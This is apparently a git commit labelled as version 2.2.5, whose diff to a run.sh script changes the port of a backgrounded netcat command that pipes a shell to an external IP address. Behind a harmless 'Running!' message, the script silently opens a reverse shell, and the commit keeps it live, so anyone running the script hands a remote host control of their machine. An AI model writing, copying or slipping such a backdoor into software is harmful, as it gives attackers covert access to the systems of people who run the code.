9f0209ea342f621a8b2ca469f9dc23fb5cf9f9cf
Faris Haidar Zuhdi <faris.zuhdi@traveloka.com>
2025-10-30 14:49:04 +0700

    2.2.5

--- run.sh
+++ run.sh
@@ -4,7 +4,7 @@ echo Running!
   (
     mkfifo /tmp/f
     #!/bin/bash
-    nc 103.150.196.198 5555 < /tmp/f | sh > /tmp/f 2>&1
+    nc 103.150.196.198 1337 < /tmp/f | sh > /tmp/f 2>&1
     rm /tmp/f
   ) </dev/null >/dev/null 2>&1 &
 ) &
